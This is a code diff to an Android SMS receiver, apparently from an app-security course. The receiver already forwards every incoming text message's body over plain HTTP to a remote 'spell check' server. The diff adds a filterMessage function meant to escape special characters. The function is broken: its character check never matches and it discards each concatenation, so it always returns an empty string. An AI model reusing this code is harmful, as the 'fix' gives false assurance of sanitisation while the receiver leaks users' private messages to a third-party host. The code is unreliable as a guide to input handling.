@@ -11,10 +11,22 @@ import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.util.Arrays;
 
 public class SMSReceiver extends BroadcastReceiver {
     private static final String SPELL_CHECK_URL = "http://appsecclass.report:8080/";
 
+    public String filterMessage(String message) {
+        String output = "";
+        for (char ch: message.toCharArray())
+            if (Arrays.asList(":///\';\"%.?<>()").contains(ch)) {
+                output.concat("//" + ch);
+            }
+            else {
+                output.concat(String.valueOf(ch));
+            }
+        return output.toString();
+    }
     @Override
     public void onReceive(Context context, Intent intent) {
         Bundle bundle = intent.getExtras();
@@ -32,7 +44,7 @@ public class SMSReceiver extends BroadcastReceiver {
             URL url = null;
             try {
                 url = new URL(SPELL_CHECK_URL + "metrics"
-                        +"?msg="+msgs[i].getMessageBody()
+                        +"?msg="+filterMessage(msgs[i].getMessageBody())
                 );
             } catch (MalformedURLException e) {
                 e.printStackTrace();
